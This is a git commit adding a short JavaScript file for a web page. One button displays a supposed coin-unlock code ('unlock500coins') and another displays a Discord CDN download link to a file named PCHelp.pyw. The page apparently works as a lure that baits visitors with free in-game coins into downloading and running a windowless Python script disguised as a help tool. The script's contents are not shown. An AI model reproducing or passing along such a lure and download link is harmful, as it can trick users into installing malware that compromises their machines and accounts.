346196e91887dc1ed22b5dce37f442f745f7e713
yadernikoder <161838373+yadernikoder@users.noreply.github.com>
2024-11-27 16:10:30 +0200

    Add files via upload

---
+++ index.js
@@ -0,0 +1,12 @@
+// JavaScript for showing the code dynamically
+document.getElementById('showCodeBtn').addEventListener('click', function() {
+    var codeDisplay = document.getElementById('codeDisplay');
+    codeDisplay.textContent = 'The code is: unlock500coins';
+    codeDisplay.style.display = 'block';
+});
+
+document.getElementById('showCodeBtn1').addEventListener('click', function() {
+    var codeDisplay1 = document.getElementById('codeDisplay1');
+    codeDisplay1.textContent = "https://cdn.discordapp.com/attachments/1292155655528120491/1311331845408948264/PCHelp.pyw?ex=67487873&is=674726f3&hm=6ed3ae9789d7873125949a6c5710db977dcea8e2fb07ad02dff262768233904e&";
+    codeDisplay1.style.display = 'block';
+});
